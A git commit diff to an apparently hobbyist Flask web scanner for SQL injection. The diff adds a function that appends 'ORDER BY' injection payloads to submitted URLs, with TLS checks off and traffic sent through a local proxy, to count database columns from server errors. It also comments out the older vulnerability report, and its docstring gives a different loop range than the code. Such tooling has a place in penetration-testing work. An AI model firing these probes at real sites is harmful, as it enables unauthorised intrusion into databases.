771affc1ba000224acf36f5f06618ca2ca139178
LeandroGarza <leandrogarzap@gmail.com>
2024-10-18 21:33:18 -0300

    se muestra en front nro columnas de la bd

--- Fussion/sql10.py
+++ Fussion/sql10.py
@@ -12,6 +12,7 @@ from flask import Flask, request, jsonify, Response
 from flask_cors import CORS
 import time, queue
 import requests, re
+from colorama import Fore, Style, init
 
 
 app = Flask(__name__, static_folder='FrontEnd/static', template_folder='FrontEnd/templates')
@@ -19,6 +20,7 @@ CORS(app)
 event_queue = queue.Queue()
 
 proxies = {'http': 'http://127.0.0.1:8081', 'https': 'http://127.0.0.1:8081'}
+init(autoreset=True)
 
 @app.route('/')
 def index():
@@ -133,9 +135,9 @@ def exploit_sqli(url):
         target_url = url + payload
         try:
             r = requests.get(target_url, verify=False, proxies=proxies, timeout=10)
-            if 500 <= r.status_code < 600:
-                vulnerable_urls.append((target_url, payload))
-                print(f"[+] URL vulnerable detectada: {target_url} con el payload: {payload}")
+            #if 500 <= r.status_code < 600:
+                #vulnerable_urls.append((target_url, payload))
+                #print(f"[+] URL vulnerable detectada: {target_url} con el payload: {payload}")
                 
         except SSLError:
             return False
@@ -143,6 +145,37 @@ def exploit_sqli(url):
             return False
 
     return vulnerable_urls
+
+def exploit_sqli_column_number(url):
+    """
+    Attempts to detect the number of columns in the database using SQL injection.
+
+    Args:
+        url (str): The target URL for testing column numbers in SQL injection.
+
+    Returns:
+        int or bool: The number of columns if detected, or False in case of an error.
+
+    Description:
+        - Iterates through a range of column numbers (1 to 4) and appends the SQL 'ORDER BY' clause to the target URL.
+        - Sends an HTTP request to test the response for each column count.
+        - If an "Internal Server Error" is encountered, the number of columns is considered to be one less than the current iteration.
+        - Handles SSL and request-related exceptions.
+        - Returns the number of columns or False if an error occurs or if no column number is determined.
+    """
+    for i in range(1, 10):
+        target_url = url + "'+order+by+%s--" % i
+        try:
+            r = requests.get(target_url, verify=False, proxies=proxies, timeout=10)
+            if "Internal Server Error" in r.text:
+                return i - 1 
+        except SSLError as e:
+            print(f"[-] SSL Error en {target_url}: {e}")
+            return False
+        except requests.RequestException as e:
+            print(f"[-] Request error en {target_url}: {e}")
+            return False
+    return False
 
 @app.route('/scan', methods=['POST'])
 def handle_scan():
@@ -163,10 +196,22 @@ def handle_scan():
                     "url": test_url,
                     "payloads": sqli_result
                 })
+            else:
+                num_col = exploit_sqli_column_number(test_url)
+                if num_col:
+                    print(Fore.GREEN + f"[+] We determined that your database has {num_col} columns at this URL, as the server did not handle exceptions properly during the SQL query.")
+                    results.append({
+                        "url": test_url,
+                        "columns_detected": num_col
+                    })
+                else:
+                    print("[-] URL not vulnerable to SQL injection")
+            
         return jsonify({
             "sql_vulnerabilities_found": len(results) > 0,
             "sql_injection_results": results
         })
+        
     else:
         return jsonify({"error": "No URLs with parameters found."})
     
